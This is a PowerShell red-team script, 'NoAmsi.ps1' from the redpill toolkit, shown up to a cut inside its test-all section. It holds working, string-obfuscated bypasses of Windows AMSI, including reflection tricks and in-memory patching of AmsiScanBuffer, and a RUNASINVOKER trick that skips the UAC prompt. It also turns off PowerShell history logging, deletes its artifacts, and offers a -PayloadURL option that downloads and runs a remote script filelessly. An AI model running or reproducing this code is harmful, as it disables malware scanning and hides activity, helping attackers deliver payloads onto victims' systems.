<#
.SYNOPSIS
   Test AMS1 string bypasses or simple execute one bypass technic!
  
   Author: r00t-3xp10it
   Tested Under: Windows 10 (19042) x64 bits
   Required Dependencies: none
   Optional Dependencies: none
   PS cmdlet Dev version: v2.7.16
   
.DESCRIPTION
   This cmdlet tests an internal list of amsi_bypass_technics on
   current shell or simple executes one of the bypass technics.
   This cmdlet re-uses: @_RastaMouse, @Mattifestation and @nullbyte
   source code POC's obfuscated {by me} to evade runtime detection.
   
.NOTES
   _Remark: The Amsi_bypasses will only work on current shell while is
   process is running. But on process close all will return to default.
   _Remark: If sellected -Action '<testall>' then this cmdlet will try
   all available bypasses and aborts at the first successfull bypass.
   _Remark: -PayloadURL '<url>' only works with -Action 'bypass' @arg.
   _Remark: -PayloadURL '<url>' does not use technic nº1 (PS_DOWNGRADE) 

.Parameter Action
   Accepts arguments: list, testall, bypass (default: bypass)

.Parameter Id
  The technic Id to use for amsi_bypass (default: 2)

.Parameter PayloadURL
  The URL script.ps1 to be downloaded\executed! (default: false)

.Parameter Appl
   The application to run in -Id '6' (default: %windir%\regedit.exe)
   
.EXAMPLE
   PS C:\> Get-Help .\NoAmsi.ps1 -full
   Access this cmdlet comment based help

.EXAMPLE
   PS C:\> .\NoAmsi.ps1 -Action List
   List ALL cmdlet Amsi_bypasses available!

.EXAMPLE
   PS C:\> .\NoAmsi.ps1 -Action TestAll
   Test ALL cmdlet Amsi_bypasses technics!

.EXAMPLE
   PS C:\> .\NoAmsi.ps1 -Action Bypass -Id 2
   Execute Amsi_bypass technic nº2 on current shell!

.EXAMPLE
   PS C:\> .\NoAmsi.ps1 -Action Bypass -Id 6 -Appl "%windir%\regedit.exe"
   Execute regedit.exe application without spawning UAC confirmation dialog.
 
.EXAMPLE
   PS C:\> .\NoAmsi.ps1 -Action bypass -PayloadURL "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/modules/GetSkype.ps1"
   Download\Execute 'GetSkype.ps1' (FileLess) trougth Ams1_bypass technic nº2 (cmdlet default technic)

.INPUTS
   None. You cannot pipe objects into NoAmsi.ps1

.OUTPUTS
   Testing amsi_bypass technics
   ----------------------------
   Id          : 1
   bypass      : success
   Disclosure  : @nullbyte
   Description : PS_DOWNGRADE_ATTACK
   POC         : Execute: -----
   Remark      : Execute: 'exit' to return to PSv5 console!

   Id          : 2
   bypass      : success
   Disclosure  : @mattifestation
   Description : DLL_REFLECTION
   POC         : Execute: ----
   Remark      : string detection disabled!

   Id          : 3
   bypass      : success
   Disclosure  : @mattifestation
   Description : FORCE_AMSI_ERROR
   POC         : Execute: ----
   Remark      : string detection disabled!
   
   Id          : 4
   bypass      : success
   Disclosure  : @_RastaMouse
   Description : AMSI_RESULT_CLEAN
   POC         : Execute: ----
   Remark      : string detection disabled!

   Id          : 5
   bypass      : success
   Disclosure  : @am0nsec
   Description : AMSI_SCANBUFFER_PATCH
   POC         : Execute: ----
   Remark      : string detection disabled! 

.LINK
   https://github.com/r00t-3xp10it/redpill
   https://news.sophos.com/en-us/2021/06/02/amsi-bypasses-remain-tricks-of-the-malware-trade
   https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_logging_windows
#>


## Non-Positional cmdlet named parameters
[CmdletBinding(PositionalBinding=$false)] param(
   [string]$Appl="%windir%\regedit.exe",
   [string]$PayloadURL="false",
   [string]$Action="Bypass",
   [int]$Id='2'
)


$viriato='0'#Redpill Conf
$CmdletVersion = "v2.7.16"
$WorkDir = ($pwd).Path.ToString()
## Global cmdlet variable declarations
$ErrorActionPreference = "SilentlyContinue"
## Disable Powershell Command Logging for current session.
Set-PSReadlineOption –HistorySaveStyle SaveNothing|Out-Null
$host.UI.RawUI.WindowTitle = "@NoAmsi $CmdletVersion {SSA@RedTeam}"


If($PayloadURL -ne "false" -and $Id -Match '^(0|1)$')
{
   Write-Host "`n[error:] -PayloadURL '<url>' does not work with Id:$Id" -ForegroundColor Red -BackgroundColor Black
   Write-Host "Defaulting to Id:2 <DL`L_REFLEC`TION_BYPAS`S>";Start-Sleep -Seconds 2
   $Id = "2" #Default Technic to use!
}

If($Action -iNotMatch '^(List|TestAll|Bypass)$')
{
   #Cmdlet mandatory parameter arguments checker!
   Write-Host "[error] This cmdlet requires -Action '<argument>' parameter!" -ForegroundColor Red -BackgroundColor Black
   Write-Host "";Start-Sleep -Seconds 2;Get-Help .\NoAmsi.ps1 -Examples;exit ## @NoAmsi 
}


#String_POC_Obfuscation
$IoStream = "am@s£+"+"ut@+l£s" -Join ''
$JPGformat = $IoStream.Replace("@","").Replace("£","").Replace("+","i")

## Create Data Table for outputs
$mytable = New-Object System.Data.DataTable
$mytable.Columns.Add("Id")|Out-Null
$mytable.Columns.Add("bypass")|Out-Null
$mytable.Columns.Add("Disclosure")|Out-Null
$mytable.Columns.Add("Description")|Out-Null
$mytable.Columns.Add("POC")|Out-Null
$mytable.Columns.Add("Report")|Out-Null


If($Action -ieq "List")
{

   <#
   .SYNOPSIS
      Author: @r00t-3xp10it
      Helper - List ALL cmdlet bypasses available!
   #>

   Write-Host "`nId Disclosure       Description            Requirements" -ForegroundColor Green
   Write-Host "-- ----------       -----------            ------------"
   Write-Host "1  @nullbyte        PS_DOW`NGRADE_ATT`ACK    PS_version2"
   Write-Host "2  @mattifestation  DL`L_REFL`ECTION         None"
   Write-Host "3  @mattifestation  FOR`CE_AM`SI_ERROR       None"
   Write-Host "4  @_RastaMouse     AMS`I_RESULT_CLEAN      Win32_API"
   Write-Host "5  @am0nsec         AM`SI_SCA`NBUFF`ER_PATCH  Win32_API"
   Write-Host "6  @oshub           RUNA`SIN`VOKER           None`n"
   Write-Host "* Syntax Examples:" -ForegroundColor Yellow
   If($viriato -eq "0")
   {
      Write-Host "   PS C:\> .\NoAmsi.ps1 -Action testall"
      Write-Host "   PS C:\> .\NoAmsi.ps1 -Action bypass -Id 2`n`n" 
   }
   Else
   {
      Write-Host "   PS C:\> .\redpill.ps1 -NoAmsi testall"
      Write-Host "   PS C:\> .\redpill.ps1 -NoAmsi bypass -Id 2`n`n"  
   }
   exit ## Exit @NoAmsi
   
}


If($Action -ieq "Bypass")
{

   Write-Host "`n`nExecute am`si_bypass technic nº$Id" -ForegroundColor Green
   Write-Host "--------------------------------"

   If($Id -eq 0 -or $Id -gt 6)
   {
      ## cmdlet mandatory requirements! {ams1 bypass technic number}
      Write-Host "[error] This cmdlet only accepts IDs: { 1, 2, 3, 4, 5, 6 }" -ForegroundColor Red -BackgroundColor Black
      Write-Host "";Start-Sleep -Seconds 2;.\NoAmsi.ps1 -Action List;exit  
   }


   If($Id -eq 1)
   {

      <#
      .SYNOPSIS
         Author: @r00t-3xp10it
         Disclosure: @nullbyte
         Helper - PS_DOWN`GRADE_ATT`ACK!

      .NOTES
         This function uses powershell version 2 if available!
      #>

      $NETversions = (Get-ChildItem "HKLM:\SOFTWARE\Microsoft\NET Framework Setup\NDP" -recurse | Get-ItemProperty -name Version -EA 0 | Where-Object { $_.PSChildName -match '^(?!S)\p{L}' }).Version
      if($NETversions -Match "2.0.50727")
      {

         ## retrieve current PS version
         $CurrentPSv = (Get-Host).Version.Major

         ## add results to table
         $mytable.Rows.Add("1",
                           "success",
                           "@nullbyte",
                           "PS_DOWNG`RADE_ATT`ACK",
                           "Execute: `"$JPGformat`"",
                           "Execute: 'exit' to return to PSv$CurrentPSv console!")|Out-Null

         #Display Output Table
         $mytable | Format-List > $env:TMP\tbl.log
         Get-Content -Path "$env:TMP\tbl.log" | Select-Object -Skip 2 |
            Out-String -Stream | ForEach-Object {
               $stringformat = If($_ -Match '(success)$'){
                  @{ 'ForegroundColor' = 'Green' } }Else{ @{ } }
               Write-Host @stringformat $_
            }

         #Delete artifact {logfile} left behind!
         Remove-Item -Path "$Env:TMP\tbl.log" -Force
         powershell -version 2

      }
      Else
      {

         ## add results to table
         $mytable.Rows.Add("1",
                           "failed",
                           "@nullbyte",
                           "PS_DOWNG`RADE_ATT`ACK",
                           "powershell -version 2 -C Get-Host",
                           ".Net version 2.0.50727 not found. Can't start PowerShell v2.")|Out-Null

         #Display Output Table
         $mytable | Format-List > $env:TMP\tbl.log
         Get-Content -Path "$env:TMP\tbl.log" | Select-Object -Skip 2 |
            Out-String -Stream | ForEach-Object {
               $stringformat = If($_ -Match '(failed)$'){
                  @{ 'ForegroundColor' = 'Red';'BackgroundColor' = 'Black' } }Else{ @{ } }
               Write-Host @stringformat $_
            }

         #Delete artifact {logfile} left behind!
         Remove-Item -Path "$Env:TMP\tbl.log" -Force

      }

   }
   ElseIf($Id -eq 2)
   {

      <#
      .SYNOPSIS
         Author: @r00t-3xp10it
         Disclosure: @mattifestation
         Helper - DL`L_REFLE`CTION!
      #>

      try{

         $MsTeamsId = "4456625220575263174452554847"
         $ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
         $Drawing = "Sy@ste£.M@ana"+"ge£e@nt" + ".Auto@£ati@on."+"A£s@i"+"U@ti@ls" -Join ''
         $Graphics = [string](0..13|%{[char][int](53+($MsTeamsId).substring(($_*2),2))}) -Replace ' '
         $imgForm = $Drawing.Replace("@","").Replace("£","m");$Bitmap = [Ref].Assembly.GetType($imgForm)
         $i0Stream = $Bitmap.GetField($Graphics,"$ComponentDeviceId,Static");$i0Stream.SetValue($null,$true)

         If($?)
         {
            ## add results to table
            $mytable.Rows.Add("2",
                              "success",
                              "@mattifestation",
                              "DL`L_REFL`ECTI`ON",
                              "Execute: `"$JPGformat`"",
                              "string detection disabled!")|Out-Null

            #Display Output Table
            $mytable|Format-List > $env:TMP\tbl.log
            Get-Content -Path "$Env:TMP\tbl.log" | Select-Object -Skip 2 |
               Out-String -Stream | ForEach-Object {
                  $stringformat = If($_ -Match '(success)$'){
                     @{ 'ForegroundColor' = 'Green' } }Else{ @{ } }
                  Write-Host @stringformat $_
               }

            If($PayloadURL -ieq "false")
            {
               #POC
               Write-Host "Proof Of Concept - technic nº2" -ForegroundColor Yellow
               Write-Host "-------------------------------------------"
               Write-Host "`$MsTeamsId = `"4456625220575263174452554847`""
               Write-Host "`$ComponentDeviceId = `"N``onP`" + `"ubl``ic`" -join ''"
               Write-Host "`$Drawing = `"Sy@ste£.M@ana`"+`"ge£e@nt`" + `".Auto@£ati@on.`"+`"A£s@i`"+`"U@ti@ls`" -Join ''"
               Write-Host "`$Graphics = [string](0..13|%{[char][int](53+(`$MsTeamsId).substring((`$_*2),2))}) -Replace ' '"
               Write-Host "`$imgForm = `$Drawing.Replace(`"@`",`"`").Replace(`"£`",`"m`");`$Bitmap = [Ref].Assembly.GetType(`$imgForm)"
               Write-Host "`$i0Stream = `$Bitmap.GetField(`$Graphics,`"`$ComponentDeviceId,Static`");`$i0Stream.SetValue(`$null,`$true)`n"
            }

            #Delete artifacts left behind
            Remove-Item -Path "$Env:TMP\tbl.log" -Force
         }

      }catch{
         Write-Host "[error] executing 'DL`L_REFLE`CTION' bypass!" -ForegroundColor Red -BackgroundColor Black
         Write-Host "`n"
      }

   }
   ElseIf($Id -eq 3)
   {

      <#
      .SYNOPSIS
         Author: @r00t-3xp10it
         Disclosure: @mattifestation
         Helper - FORCE_AM`SI_ERROR!
      #>

      try{

         $Xdatabase = 'Utils';$Homedrive = 'si'
         $DiskMgr = "Syst+@.M£n£g"+"e@+nt.Auto@"+"£tion.A" -join ''
         $fdx = "@ms"+"£In£"+"tF@£"+"l+d" -Join '';Start-Sleep -Milliseconds 300
         $CleanUp = $DiskMgr.Replace("@","m").Replace("£","a").Replace("+","e")
         $Rawdata = $fdx.Replace("@","a").Replace("£","i").Replace("+","e")
         $SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
         $Spotfix = $SDcleanup.GetField(($Rawdata),'NonPublic,Static')
         $Spotfix.SetValue($null,$true)

         If($?)
         {
            ## add results to table
            $mytable.Rows.Add("3",
                              "success",
                              "@mattifestation",
                              "FORCE_AM`SI_ERROR",
                              "Execute: `"$JPGformat`"",
                              "string detection disabled!")|Out-Null

            #Display Output Table
            $mytable|Format-List > $env:TMP\tbl.log
            Get-Content -Path "$Env:TMP\tbl.log" | Select-Object -Skip 2 |
               Out-String -Stream | ForEach-Object {
                  $stringformat = If($_ -Match '(success)$'){
                     @{ 'ForegroundColor' = 'Green' } }Else{ @{ } }
                  Write-Host @stringformat $_
               }

            If($PayloadURL -ieq "false")
            {
               #POC
               Write-Host "Proof Of Concept - technic nº3" -ForegroundColor Yellow
               Write-Host "-------------------------------------------"
               Write-Host "`$Xdatabase = 'Utils';`$Homedrive = 'si'"
               Write-Host "`$DiskMgr = `"Syst+@.M£n£g`"+`"e@+nt.Auto@`"+`"£tion.A`" -join ''"
               Write-Host "`$fdx = `"@ms`"+`"£In£`"+`"tF@£`"+`"l+d`" -Join '';Start-Sleep -Milliseconds 200"
               Write-Host "`$CleanUp = `$DiskMgr.Replace(`"@`",`"m`").Replace(`"£`",`"a`").Replace(`"+`",`"e`")"
               Write-Host "`$Rawdata = `$fdx.Replace(`"@`",`"a`").Replace(`"£`",`"i`").Replace(`"+`",`"e`")"
               Write-Host "`$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f `$CleanUp,`$Homedrive,`$Xdatabase))"
               Write-Host "`$Spotfix = `$SDcleanup.GetField((`$Rawdata),'NonPublic,Static')"
               Write-Host "`$Spotfix.SetValue(`$null,`$true)`n"
            }

            #Delete artifacts left behind
            Remove-Item -Path "$Env:TMP\tbl.log" -Force
         }

      }catch{
         Write-Host "[error] executing 'FORCE_AM`SI_ERROR' bypass!" -ForegroundColor Red -BackgroundColor Black
         Write-Host "`n"
      }

   }
   ElseIf($Id -eq 4)
   {

      <#
      .SYNOPSIS
         Author: @r00t-3xp10it
         Disclosure: @_RastaMouse
         Helper - AM`SI_RES`ULT_CLEAN!
      #>

      try{

         $p = 0
         $Win32 = @"
            using System;
            using System.Runtime.InteropServices;

            public class Win32 {
               [DllImport("kernel32")]
               public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

               [DllImport("kernel32")]
               public static extern IntPtr LoadLibrary(string name);

               [DllImport("kernel32")]
               public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
            }
"@

         Add-Type $Win32
         #Add_Assembly_InteropServices
         $test = [Byte[]](0x61, 0x6d, 0x73, 0x69, 0x2e, 0x64, 0x6c, 0x6c)
         $LoadLibrary = [Win32]::LoadLibrary([System.Text.Encoding]::ASCII.GetString($test))
         $test2 = [Byte[]] (0x41, 0x6d, 0x73, 0x69, 0x53, 0x63, 0x61, 0x6e, 0x42, 0x75, 0x66, 0x66, 0x65, 0x72)
         $Address = [Win32]::GetProcAddress($LoadLibrary, [System.Text.Encoding]::ASCII.GetString($test2))

         [Win32]::VirtualProtect($Address, [uint32]5, 0x40, [ref]$p);Start-Sleep -Milliseconds 670
         $Patch = [Byte[]] (0x31, 0xC0, 0x05, 0x78, 0x01, 0x19, 0x7F, 0x05, 0xDF, 0xFE, 0xED, 0x00, 0xC3)
         [System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $Address, $Patch.Length)

         If($?)
         {
            ## add results to table
            $mytable.Rows.Add("4",
                              "success",
                              "@_RastaMouse",
                              "AM`SI_RES`ULT_CLEAN",
                              "Execute: `"$JPGformat`"",
                              "string detection disabled!")|Out-Null

            #Display Output Table
            $mytable|Format-List > $env:TMP\tbl.log
            Get-Content -Path "$env:TMP\tbl.log" | Select-Object -Skip 1 |
               Out-String -Stream | ForEach-Object {
                  $stringformat = If($_ -Match '(success)$'){
                     @{ 'ForegroundColor' = 'Green' } }Else{ @{ } }
                  Write-Host @stringformat $_
               }

            If($PayloadURL -ieq "false")
            {
               #POC
               Write-Host "Proof Of Concept - technic nº4" -ForegroundColor Yellow
               Write-Host "-------------------------------------------"
               Write-Host "https://gist.github.com/r00t-3xp10it/f414f392ea99cecc3cba1d08abd286b5#gistcomment-3808722`n"
            }

            #Delete artifacts left behind
            Remove-Item -Path "$Env:TMP\tbl.log" -Force
         }

      }catch{
         Write-Host "[error] executing 'AM`SI_RESULT_CLEAN' bypass!" -ForegroundColor Red -BackgroundColor Black
         Write-Host "`n"
      }

   }
   ElseIf($Id -eq 5)
   {

      <#
      .SYNOPSIS
         Author: @r00t-3xp10it
         Disclosure: @am0nsec
         Helper - AM`SI_SCANBUFF`ER_PATCH!
      #>

      try{

         $Kernel32 = @"
         using System;
         using System.Runtime.InteropServices;

         public class Kernel32 {
            [DllImport("kernel32")]
            public static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);

            [DllImport("kernel32")]
            public static extern IntPtr LoadLibrary(string lpLibFileName);

            [DllImport("kernel32")]
            public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}
"@

         Add-Type $Kernel32
         Class Hunter {
           static [IntPtr] FindAddress([IntPtr]$address, [byte[]]$egg){
               while($true){
                   [int]$count = 0

                   while($true){
                       [IntPtr]$address = [IntPtr]::Add($address, 1)
                       If([System.Runtime.InteropServices.Marshal]::ReadByte($address) -eq $egg.Get($count)){
                           $count++
                           If($count -eq $egg.Length){
                               return [IntPtr]::Subtract($address, $egg.Length - 1)
                           }
                       } Else { break }
                   }
               }

               return $address
           }
       }

       [IntPtr]$hModule = [Kernel32]::LoadLibrary("amsi.dll")
       Write-Host "[+] AMSI DLL Handle: $hModule"

       [IntPtr]$dllCanUnloadNowAddress = [Kernel32]::GetProcAddress($hModule, "DllCanUnloadNow")
       Write-Host "[+] DllCanUnloadNow address: $dllCanUnloadNowAddress"

       If([IntPtr]::Size -eq 8) {
	       Write-Host "[+] Process architecture: 64-bits process"
           [byte[]]$egg = [byte[]] (
               0x4C, 0x8B, 0xDC,       # mov     r11,rsp
               0x49, 0x89, 0x5B, 0x08, # mov     qword ptr [r11+8],rbx
               0x49, 0x89, 0x6B, 0x10, # mov     qword ptr [r11+10h],rbp
               0x49, 0x89, 0x73, 0x18, # mov     qword ptr [r11+18h],rsi
               0x57,                   # push    rdi
               0x41, 0x56,             # push    r14
               0x41, 0x57,             # push    r15
               0x48, 0x83, 0xEC, 0x70  # sub     rsp,70h
           )
       } Else {
	       Write-Host "[+] Process architecture: 32-bits process"
           [byte[]]$egg = [byte[]] (
               0x8B, 0xFF,             # mov     edi,edi
               0x55,                   # push    ebp
               0x8B, 0xEC,             # mov     ebp,esp
               0x83, 0xEC, 0x18,       # sub     esp,18h
               0x53,                   # push    ebx
               0x56                    # push    esi
           )
       }
       [IntPtr]$targetedAddress = [Hunter]::FindAddress($dllCanUnloadNowAddress, $egg)
       Write-Host "[+] Targeted address: $targetedAddress`n"

       $oldProtectionBuffer = 0
       [Kernel32]::VirtualProtect($targetedAddress, [uint32]2, 4, [ref]$oldProtectionBuffer) | Out-Null

       $patch = [byte[]] (
           0x31, 0xC0,    # xor rax, rax
           0xC3           # ret  
       )
       [System.Runtime.InteropServices.Marshal]::Copy($patch, 0, $targetedAddress, 3)

       $a = 0
       [Kernel32]::VirtualProtect($targetedAddress, [uint32]2, $oldProtectionBuffer, [ref]$a) | Out-Null

         If($?)
         {
            ## add results to table
            $mytable.Rows.Add("5",
                              "success",
                              "@am0nsec",
                              "AM`SI_SCANBUF`FER_PATCH",
                              "Execute: `"$JPGformat`"",
                              "string detection disabled!")|Out-Null

            #Dis play Output Table
            $mytable|Format-List > $env:TMP\tbl.log
            Get-Content -Path "$Env:TMP\tbl.log" | Select-Object -Skip 2 |
               Out-String -Stream | ForEach-Object {
                  $stringformat = If($_ -Match '(success)$'){
                     @{ 'ForegroundColor' = 'Green' } }Else{ @{ } }
                  Write-Host @stringformat $_
               }

            If($PayloadURL -ieq "false")
            {
               #POC
               Write-Host "Proof Of Concept - technic nº5" -ForegroundColor Yellow
               Write-Host "-------------------------------------------"
               Write-Host "https://gist.github.com/r00t-3xp10it/f414f392ea99cecc3cba1d08abd286b5#gistcomment-3808725`n"
            }

            #Delete artifacts left behind
            Remove-Item -Path "$Env:TMP\tbl.log" -Force
         }

      }catch{
         Write-Host "[error] executing 'AMS`I_SCANBUF`FER_PATCH' bypass!" -ForegroundColor Red -BackgroundColor Black
         Write-Host "`n"
      }

   }
   ElseIf($Id -eq 6)
   {

      <#
      .SYNOPSIS
         Author: @r00t-3xp10it
         Disclosure: @OsHub
         Helper - RUN`ASINV`OKER!

      .NOTES
         This function allow users to execute appl without spawn UAC dialog box
         Remark: The application will not run in an elevated context (administrator)
      #>

      #Create testscript (To run regedit) on %tmp% directory!
      $RandomMe = -join ((65..90) + (97..122) | Get-Random -Count 7 | % {[char]$_})
      $CreateTestScript = @("cmd /min /C `"set __COMPAT_LAYER=RUNASINVOKER && start `"`" $Appl`"")
      echo "$CreateTestScript"|Out-File "$Env:TMP\$RandomMe.bat" -encoding ascii -force

      Try{

         #Execute bat file
         Start-Process -FilePath "$Env:TMP\$RandomMe.bat"

         ## add results to table
         $mytable.Rows.Add("6",
                           "success",
                           "@OsHub",
                           "RUN`ASINV`OKER",
                           "Execute: `"$Appl`"",
                           "application executed without spawn UAC dialog!")|Out-Null
      }catch{

         ## add results to table
         $mytable.Rows.Add("6",
                           "failed",
                           "@OsHub",
                           "RUN`ASINV`OKER",
                           "Execute: `"$Appl`"",
                           "Fail to execute application without spawn UAC dialog!")|Out-Null

      }

      #Display Output Table
      $mytable | Format-List > $env:TMP\tbl.log
      Get-Content -Path "$Env:TMP\tbl.log" | Select-Object -Skip 2 |
         Out-String -Stream | ForEach-Object {
            $stringformat = If($_ -iMatch '(success)$')
            {
               @{ 'ForegroundColor' = 'Green' }
            }
            ElseIf($_ -Match '(failed|fail)')
            {
               @{ 'ForegroundColor' = 'Red' }
            }
            Else
            {
               @{ 'ForegroundColor' = 'White' }         
            }
               Write-Host @stringformat $_
         }

         Start-Sleep -Seconds 1
         ## Delete artifacts left behind!
         If(Test-Path -Path "$Env:TMP\$RandomMe.bat"){
            Remove-Item -Path "$Env:TMP\$RandomMe.bat" -Force -Confirm:$false
            Remove-Item -Path "$Env:TMP\tbl.log" -Force -Confirm:$false
         }
   }
   exit
}


If($Action -ieq "TestAll")
{

   <#
   .SYNOPSIS
      Author: @r00t-3xp10it
      Helper - Test ALL cmdlet available bypasses!
      
   .NOTES
      This function will stop testing bypass techniques at
      the first command line returned successfull executed.
   #>

   Write-Host "`n`nTesting am`si_bypass technics" -ForegroundColor Green
   Write-Host "----------------------------"

      <#
      .SYNOPSIS
         Author: @r00t-3xp10it
         Disclosure: @nullbyte
         Helper - PS_DOWNG`RADE_ATT`ACK!
      #>

      $NETversions = (Get-ChildItem "HKLM:\SOFTWARE\Microsoft\NET Framework Setup\NDP" -recurse | Get-ItemProperty -name Version -EA 0 | Where-Object { $_.PSChildName -match '^(?!S)\p{L}' }).Version
      if($NETversions -Match "2.0.50727")
      {

         ## retrieve current PS version
         $CurrentPSv = (Get-Host).Version.Major

         ## add results to table
         $mytable.Rows.Add("1",
                           "success",
                           "@nullbyte",
                           "PS_DOWNG`RADE_ATT`ACK",
                           "Execute: `"$JPGformat`"",
                           "Execute: 'exit' to return to PSv$CurrentPSv console!")|Out-Null

         #Display Output Table
         $mytable | Format-List > $env:TMP\tbl.log
         Get-Content -Path "$env:TMP\tbl.log" | Select-Object -Skip 2 |
            Out-String -Stream | ForEach-Object {
               $stringformat = If($_ -Match '(success)$'){
                  @{ 'ForegroundColor' = 'Green' } }Else{ @{ } }
               Write-Host @stringformat $_
            }

         #Delete artifact {logfile} left behind!
         Remove-Item -Path "$Env:TMP\tbl.log" -Force
         powershell -version 2
         #success exec = exit
         exit

      }
      Else
      {

         ## add results to table
         $mytable.Rows.Add("1",
                           "failed",
                           "@nullbyte",
                           "PS_DOWNG`RADE_ATT`ACK",
                           "powershell -version 2 -C Get-Host",
                           ".Net version 2.0.50727 not found. Can't start PowerShell v2.")|Out-Null

         #Delete artifact {logfile} left behind!
         Remove-Item -Path "$Env:TMP\tbl.log" -Force

	  }

       <#
      .SYNOPSIS
         Author: @r00t-3xp10it
         Disclosure: @mattifestation
         Helper - DL`L_REFLE`CTION!
      #>

      try{

         $MsTeamsId = "4456625220575263174452554847"
         $ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
         $Drawing = "Sy@ste£.M@ana"+"ge£e@nt" + ".Auto@£ati@on."+"A£s@i"+"U@ti@ls" -Join ''
         $Graphics = [string](0..13|%{[char][int](53+($MsTeamsId).substring(($_*2),2))}) -Replace ' '
         $imgForm = $Drawing.Replace("@","").Replace("£","m");$Bitmap = [Ref].Assembly.GetType($imgForm)
         $i0Stream = $Bitmap.GetField($Graphics,"$ComponentDeviceId,Static");$i0Stream.SetValue($null,$true)

         If($?)
         {
            ## add results to table
            $mytable.Rows.Add("2",
                              "success",
                              "@mattifestation",
                              "DL`L_REFL`ECTI`ON",
                              "Execute: `"$JPGformat`"",
                              "string detection disabled!")|Out-Null

            #Display Output Table
            $mytable | Format-List > $env:TMP\tbl.log
            Get-Content -Path "$Env:TMP\tbl.log" | Select-Object -Skip 2 |
               Out-String -Stream | ForEach-Object {
                  $stringformat = If($_ -Match '(success)$'){
                     @{ 'ForegroundColor' = 'Green' } }Else{ @{ } }
                  Write-Host @stringformat $_
               }

            ## POC display
            Start-Sleep -Milliseconds 680
            Write-Host "Proof Of Concept - technic nº2" -ForegroundColor Yellow
            Write-Host "-------------------------------------------"
            Write-Host "`$MsTeamsId = `"4456625220575263174452554847`""
            Write-Host "`$ComponentDeviceId = `"N``onP`" + `"ubl``ic`" -join ''"
            Write-Host "`$Drawing = `"Sy@ste£.M@ana`"+`"ge£e@nt`" + `".Auto@£ati@on.`"+`"A£s@i`"+`"U@ti@ls`" -Join ''"
            Write-Host "`$Graphics = [string](0..13|%{[char][int](53+(`$MsTeamsId).substring((`$_*2),2))}) -Replace ' '"
            Write-Host "`$imgForm = `$Drawing.Replace(`"@`",`"`").Replace(`"£`",`"m`");`$Bitmap = [Ref].Assembly.GetType(`$imgForm)"
            Write-Host "`$i0Stream = `$Bitmap.GetField(`$Graphics,`"`$ComponentDeviceId,Static`");`$i0Stream.SetValue(`$null,`$true)`n"

            #Delete artifacts left behind
            Remove-Item -Path "$Env:TMP\tbl.log" -Force
            #success exec = exit
            exit
         }

      }catch{
         Write-Host "[error] executing 'DL`L_REFLE`CTION' bypass!" -ForegroundColor Red -BackgroundColor Black
         Write-Host "`n"
      }

      <#
      .SYNOPSIS
         Author: @r00t-3xp10it
         Disclosure: @mattifestation
         Helper - FORCE_AM`SI_ERROR!
      #>

      try{

         $Xdatabase = 'Utils';$Homedrive = 'si'
         $DiskMgr = "Syst+@.M£n£g"+"e@+nt.Auto@"+"£tion.A" -join ''
         $fdx = "@ms"+"£In£"+"tF@£"+"l+d" -Join '';Start-Sleep -Milliseconds 300
         $CleanUp = $DiskMgr.Replace("@","m").Replace("£","a").Replace("+","e")
         $Rawdata = $fdx.Replace("@","a").Replace("£","i").Replace("+","e")
         $SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
         $Spotfix = $SDcleanup.GetField(($Rawdata),'NonPublic,Static')
         $Spotfix.SetValue($null,$true)

         If($?)
         {
            ## add results to table
            $mytable.Rows.Add("3",
                              "success",
                              "@mattifestation",
                              "FORCE_AM`SI_ERROR",
                              "Execute: `"$JPGformat`"",
                              "string detection disabled!")|Out-Null

            #Display Output Table
            $mytable | Format-List > $env:TMP\tbl.log
            Get-Content -Path "$Env:TMP\tbl.log" | Select-Object -Skip 2 |
               Out-String -Stream | ForEach-Object {
                  $stringformat = If($_ -Match '(success)$'){
                     @{ 'ForegroundColor' = 'Green' } }Else{ @{ } }
                  Write-Host @stringformat $_
               }

            #POC
            Start-Sleep -Milliseconds 680
            Write-Host "Proof Of Concept - technic nº3" -ForegroundColor Yellow
            Write-Host "-------------------------------------------"
            Write-Host "`$Xdatabase = 'Utils';`$Homedrive = 'si'"
            Write-Host "`$DiskMgr = `"Syst+@.M£n£g`"+`"e@+nt.Auto@`"+`"£tion.A`" -join ''"
            Write-Host "`$fdx = `"@ms`"+`"£In£`"+`"tF@£`"+`"l+d`" -Join '';Start-Sleep -Milliseconds 280"
            Write-Host "`$CleanUp = `$DiskMgr.Replace(`"@`",`"m`").Replace(`"£`",`"a`").Replace(`"+`",`"e`")"
            Write-Host "`$Rawdata = `$fdx.Replace(`"@`",`"a`").Replace(`"£`",`"i`").Replace(`"+`",`"e`")"
            Write-Host "`$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f `$CleanUp,`$Homedrive,`$Xdatabase))"
            Write-Host "`$Spotfix = `$SDcleanup.GetField((`$Rawdata),'NonPublic,Static')"
            Write-Host "`$Spotfix.SetValue(`$null,`$true)`n"

            #Delete artifacts left behind
            Remove-Item -Path "$Env:TMP\tbl.log" -Force
            #success exec = exit
            exit
         }

      }catch{
         Write-Host "[error] executing 'FORCE_AM`SI_ERROR' bypass!" -ForegroundColor Red -BackgroundColor Black
         Write-Host "`n"  
      }

      <#
      .SYNOPSIS
         Author: @r00t-3xp10it
         Disclosure: @_RastaMouse
         Helper - AM`SI_RES`ULT_CLEAN!
      #>

      try{

         $p = 0
         $Win32 = @"
            using System;
            using System.Runtime.InteropServices;

            public class Win32 {
               [DllImport("kernel32")]
               public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

               [DllImport("kernel32")]
               public static extern IntPtr LoadLibrary(string name);

               [DllImport("kernel32")]
               public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
            }
"@

         Add-Type $Win32
         #Add_Assembly_InteropServices
